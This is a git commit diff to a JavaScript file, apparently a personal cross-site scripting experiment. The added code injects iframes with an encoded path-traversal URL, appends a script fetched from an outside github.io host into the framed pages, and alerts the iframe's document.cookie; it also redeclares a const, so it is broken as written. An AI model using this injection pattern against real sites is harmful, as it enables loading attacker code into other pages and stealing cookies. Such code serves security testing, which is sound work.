c8901ea9243cf30819285dc482dc2155a0383b6e
vasilevigor3 <32871596+vasilevigor3@users.noreply.github.com>
2023-08-13 17:12:50 +0400

    Update aler2.js

--- aler2.js
+++ aler2.js
@@ -3,7 +3,21 @@ const iframe = document.querySelector('.asd');
 
 iframe.addEventListener('load', () => {
     const iframeWindow = iframe.contentWindow;
-    iframeWindow.location.href = 'https://wikipedia.org';
-    iframeWindow.location.href = 'https://kinopoisk.ru/';
+    const documentIframeWindow = iframeWindow.document;
+
+    const injectedFrame=document.createElement("iframe");
+    injectedFrame.src="/%2e%2e%2f";
+    documentIframeWindow.body.appendChild(injectedFrame);
+    script=document.createElement('script');
+    script.src='https://vasilevigor3.github.io/myjs.js';
+    iframeWindow.frames[0].document.head.appendChild(script);
+
+    const injectedFrame=document.createElement("iframe");
+    injectedFrame.src="/%2e%2e%2f";
+    documentIframeWindow.body.appendChild(injectedFrame);
+    script=document.createElement('script');
+    script.src='https://vasilevigor3.github.io/myjs.js';
+    iframeWindow.frames[1].document.head.appendChild(script);
+    
     iframeWindow.alert(iframe.contentWindow.document.cookie);		
 });
